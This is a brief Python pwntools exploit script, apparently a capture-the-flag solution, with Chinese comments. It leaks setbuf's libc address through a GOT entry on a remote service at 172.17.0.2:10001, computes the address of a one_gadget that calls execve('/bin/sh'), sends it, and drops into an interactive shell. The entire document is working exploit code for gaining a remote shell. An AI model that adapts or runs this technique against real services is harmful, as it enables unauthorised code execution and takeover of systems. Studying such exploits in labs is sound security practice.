#!/usr/bin/python
#coding:utf-8

from pwn import *

one_gadget_rce = 0x45526
#one_gadget libc.so.6_x64
#0x45526	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  rax == NULL
setbuf_addr = 0x77f50	
setbuf_got = 0x600ae0

io = remote("172.17.0.2", 10001)

io.sendline(str(setbuf_got))
io.recvuntil("Value: ")
setbuf_memory_addr = int(io.recv()[:18], 16)	#通过打印got表中setbuf项的内容泄露setbuf在内存中的首地址

io.sendline(str(setbuf_memory_addr - (setbuf_addr - one_gadget_rce)))	#通过偏移计算one_gadget_rce在内存中的地址

io.interactive()
